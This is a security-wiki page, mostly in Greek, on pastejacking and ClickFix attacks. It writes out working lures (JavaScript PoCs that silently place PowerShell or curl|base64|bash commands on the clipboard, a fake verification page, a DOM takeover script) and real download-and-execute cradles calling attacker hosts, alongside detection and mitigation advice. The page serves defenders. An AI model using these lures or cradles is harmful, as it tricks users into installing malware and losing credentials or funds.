# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – παλιά αλλά ακόμα έγκυρη συμβουλή

## Επισκόπηση

Το clipboard hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συνήθως κάνουν copy-and-paste εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη web page (ή οποιοδήποτε JavaScript-capable context όπως μια εφαρμογή Electron ή Desktop) τοποθετεί προγραμματισμένα κείμενο ελεγχόμενο από τον attacker στο system clipboard. Τα θύματα ενθαρρύνονται, συνήθως μέσω προσεκτικά διαμορφωμένων social-engineering οδηγιών, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα terminal και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας αμέσως arbitrary commands.

Επειδή **δεν γίνεται download αρχείου και δεν ανοίγει attachment**, η τεχνική παρακάμπτει τα περισσότερα e-mail και web-content security controls που παρακολουθούν attachments, macros ή direct command execution. Η επίθεση είναι επομένως δημοφιλής σε phishing campaigns που διανέμουν commodity malware families όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## Wallet-address replacement clippers

Μια άλλη παραλλαγή **clipboard hijacking** δεν επικολλά καθόλου commands: περιμένει μέχρι το θύμα να αντιγράψει μια **cryptocurrency wallet address**, και μετά την αντικαθιστά αθόρυβα με μια address του attacker ακριβώς πριν από το paste. Αυτό είναι ιδιαίτερα αποτελεσματικό απέναντι σε μακριές wallet formats επειδή οι χρήστες συχνά ελέγχουν μόνο τα πρώτα/τελευταία characters.

Συνήθη χαρακτηριστικά στον πραγματικό κόσμο:
- **Thin loader + nested payload**: το ορατό app/exe μοιάζει με νόμιμο trading ή "profit" tool, ενώ το πραγματικό clipper είναι κρυμμένο βαθύτερα στο bundle (για παράδειγμα ένας .NET loader που εκκινεί ένα nested Rust payload).
- **Regex-driven replacement**: το malware ταιριάζει strings όπως `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ή ακόμη και generic **44-character Solana-like** strings και τα ξαναγράφει σε attacker wallets.
- **Wallet rotation at scale**: σύγχρονα Windows samples μπορεί να ενσωματώνουν **χιλιάδες** replacement wallets ανά currency αντί για μία στατική address, μειώνοντας το wallet reputation burn μετά από κάθε κλοπή.

### Windows clipper flow

Μια συνηθισμένη υλοποίηση είναι ένα hidden window καταχωρημένο με **`AddClipboardFormatListener`**. Σε κάθε clipboard update, το malware συνήθως καλεί:
- **`OpenClipboard`** → πρόσβαση στα τρέχοντα clipboard data.
- **`GetClipboardData`** → ανάγνωση text.
- **`EmptyClipboard`** + **`SetClipboardData`** → αντικατάσταση του wallet string με την τιμή του attacker.

Minimal hunting regexes συχνά εμφανίζονται σε clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Η διατήρηση σε επίπεδο χρήστη αρκεί για impact. Ένα παρατηρημένο μοτίβο είναι:
- Αντιγραφή του payload στο **`%APPDATA%\silke\silke.exe`**
- Δημιουργία ενός **Startup-folder LNK** κάτω από `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ιδέες για detection:
- Processes που καλούν clipboard APIs συνεχώς ενώ επίσης γράφουν κάτω από `%APPDATA%` και τον φάκελο χρήστη **Startup**.
- Νέα δημιουργία LNK/executable ακολουθούμενη από wallet-address clipboard rewrites.
- Archives ή fake-software bundles που περιέχουν πολλά unused files plus ένα μικρό launcher που ξεκινά ένα nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Στο macOS, ορισμένες campaigns διανέμουν ένα **`unlocker.command`** helper και καθοδηγούν το θύμα να κάνει δεξί κλικ → **Open** αν το Gatekeeper λέει ότι η app είναι damaged ή από unidentified developer. Το script απλώς αφαιρεί το quarantine και εκκινεί το κοντινό `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Αυτό **δεν** είναι Gatekeeper exploit· είναι ένα **social-engineered quarantine bypass** που εκμεταλλεύεται το γεγονός ότι οι αποφάσεις του Gatekeeper εξαρτώνται από το `com.apple.quarantine` xattr.

Μετά την εκτέλεση, ο clipper μπορεί να επιμένει ως ο τρέχων χρήστης γράφοντας:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent με `RunAtLoad` και `KeepAlive`

Μια χρήσιμη αμυντική λεπτομέρεια είναι ότι ορισμένα δείγματα υλοποιούν ένα **self-healing watchdog** που ξαναγράφει το LaunchAgent και το wrapper κάθε ~30 seconds. Αν αφαιρέσεις πρώτα το plist **χωρίς να σκοτώσεις το τρέχον process**, το malware μπορεί να το αναδημιουργήσει αμέσως. Ασφαλής σειρά καθαρισμού:
1. Σκότωσε το ενεργό clipper process.
2. Unload/delete το LaunchAgent plist.
3. Διέγραψε το `~/launch.sh` και το copied payload.

### Delivery note: fake reputation as a force multiplier

Για αυτή την οικογένεια, το ίδιο το malware μπορεί να παραμείνει τεχνικά απλό ενώ το **distribution layer** κάνει τη βαριά δουλειά: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, και benign-looking VirusTotal comments/votes χρησιμοποιούνται για να κάνουν το binary να φαίνεται αξιόπιστο πριν την εκτέλεση.

## Forced copy buttons and hidden payloads (macOS one-liners)

Ορισμένα macOS infostealers κλωνοποιούν installer sites (π.χ. Homebrew) και **αναγκάζουν τη χρήση ενός “Copy” button** ώστε οι χρήστες να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η clipboard entry περιέχει την αναμενόμενη εντολή εγκατάστασης μαζί με ένα προσαρτημένο Base64 payload (π.χ., `...; echo <b64> | base64 -d | sh`), έτσι ώστε ένα μόνο paste να εκτελεί και τα δύο ενώ το UI κρύβει το επιπλέον stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Οι παλαιότερες campaigns χρησιμοποιούσαν `document.execCommand('copy')`, ενώ οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Ο χρήστης επισκέπτεται ένα typosquatted ή compromised site (π.χ. `docusign.sa[.]com`)
2. Το injected **ClearFake** JavaScript καλεί μια βοηθητική συνάρτηση `unsecuredCopyToClipboard()` που αποθηκεύει σιωπηλά στο clipboard ένα Base64-encoded PowerShell one-liner.
3. Οι HTML οδηγίες λένε στο θύμα να: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. Το `powershell.exe` εκτελείται, κατεβάζοντας ένα archive που περιέχει ένα legitimate executable plus ένα malicious DLL (classic DLL sideloading).
5. Ο loader decrypts επιπλέον stages, injects shellcode και εγκαθιστά persistence (π.χ. scheduled task) – τελικά τρέχοντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* Το `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά στον κατάλογό του το `msvcp140.dll`.
* Το κακόβουλο DLL επιλύει δυναμικά τα APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα rolling XOR key `"https://google.com/"`, κάνει inject το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει το `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Ανακτά ένα MSI payload → ρίχνει το `libcef.dll` δίπλα σε μια signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση **mshta** εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανακατασκευάζει το `AutoIt3.exe` μέσω `extrac32` & file concatenation και τελικά εκτελεί ένα `.a3x` script το οποίο exfiltrates browser credentials στο `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες ClickFix campaigns παραλείπουν εντελώς τα file downloads και καθοδηγούν τα θύματα να κάνουν paste ένα one-liner που κάνει fetch και εκτελεί JavaScript μέσω WSH, το διατηρεί επίμονα, και περιστρέφει το C2 καθημερινά. Παράδειγμα chain που παρατηρήθηκε:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Κύρια χαρακτηριστικά
- Obfuscated URL αντιστρέφεται κατά το runtime για να αποτρέπει το απλό inspection.
- Το JavaScript επιμένει μέσω ενός Startup LNK (WScript/CScript), και επιλέγει το C2 με βάση την τρέχουσα ημέρα – επιτρέποντας γρήγορη domain rotation.

Ελάχιστο JS fragment που χρησιμοποιείται για να κάνει rotate τα C2s ανά ημερομηνία:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Επόμενο στάδιο συνήθως αναπτύσσει ένα loader που εγκαθιστά persistence και τραβά ένα RAT (π.χ. PureHVNC), συχνά κάνοντας TLS pinning σε ένα hardcoded certificate και τεμαχίζοντας την traffic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command-line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily-rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Πρόσφατες campaigns μαζικά παράγουν ψεύτικες σελίδες επαλήθευσης CDN/browser ("Just a moment…", IUAM-style) που εξαναγκάζουν τους χρήστες να αντιγράψουν OS-specific commands από το clipboard τους σε native consoles. Αυτό μεταφέρει την εκτέλεση έξω από το browser sandbox και λειτουργεί σε Windows και macOS.

Κύρια χαρακτηριστικά των builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion.
- Automatic clipboard-copy on benign UI actions (checkbox/Copy) while the visible text may differ from the clipboard content.
- Mobile blocking and a popover with step-by-step instructions: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required).

Παράδειγμα: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence της αρχικής εκτέλεσης
- Χρησιμοποίησε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχίζεται αφού κλείσει το τερματικό, μειώνοντας τα ορατά artifacts.

In-place page takeover σε compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες ανίχνευσης & hunting ειδικά για IUAM-style lures
- Web: Σελίδες που δένουν το Clipboard API με verification widgets· ασυμφωνία ανάμεσα στο εμφανιζόμενο κείμενο και το clipboard payload· `navigator.userAgent` branching· Tailwind + single-page replace σε ύποπτα contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από browser interaction· batch/MSI installers που εκτελούνται από `%TEMP%`.
- macOS endpoint: Terminal/iTerm που κάνει spawn `bash`/`curl`/`base64 -d` με `nohup` κοντά σε browser events· background jobs που επιβιώνουν μετά το κλείσιμο του terminal.
- Συσχέτισε το `RunMRU` Win+R history και τα clipboard writes με subsequent console process creation.

Δείτε επίσης για supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- Το ClearFake συνεχίζει να παραβιάζει WordPress sites και να injectάρει loader JavaScript που αλυσοδένει external hosts (Cloudflare Workers, GitHub/jsDelivr) και ακόμη blockchain “etherhiding” calls (π.χ. POSTs σε Binance Smart Chain API endpoints όπως `bsc-testnet.drpc[.]org`) για να τραβά το τρέχον lure logic. Τα πρόσφατα overlays χρησιμοποιούν έντονα fake CAPTCHAs που δίνουν οδηγίες στους χρήστες να copy/paste ένα one-liner (T1204.004) αντί να κατεβάσουν οτιδήποτε.
- Η initial execution ανατίθεται ολοένα και περισσότερο σε signed script hosts/LOLBAS. Τα chains του Ιανουαρίου 2026 αντικατέστησαν την προηγούμενη χρήση `mshta` με το built-in `SyncAppvPublishingServer.vbs` εκτελεσμένο μέσω `WScript.exe`, περνώντας PowerShell-like arguments με aliases/wildcards για να fetch remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- Το `SyncAppvPublishingServer.vbs` είναι signed και χρησιμοποιείται κανονικά από το App-V; σε συνδυασμό με το `WScript.exe` και ασυνήθιστες παραμέτρους (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) γίνεται ένα υψηλής ένδειξης LOLBAS stage για το ClearFake.
- Τον Φεβρουάριο του 2026 τα fake CAPTCHA payloads επέστρεψαν σε καθαρά PowerShell download cradles. Δύο live παραδείγματα:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Το πρώτο chain είναι ένα in-memory `iex(irm ...)` grabber· το δεύτερο κάνει stage μέσω `WinHttp.WinHttpRequest.5.1`, γράφει ένα προσωρινό `.ps1`, και μετά το εκκινεί με `-ep bypass` σε κρυφό παράθυρο.

Συμβουλές detection/hunting για αυτές τις παραλλαγές
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ή PowerShell cradles αμέσως μετά από clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domains jsDelivr/GitHub/Cloudflare Worker, ή raw IP `iex(irm ...)` patterns.
- Network: outbound σε CDN worker hosts ή blockchain RPC endpoints από script hosts/PowerShell λίγο μετά από web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners· block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing με external URLs ή obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
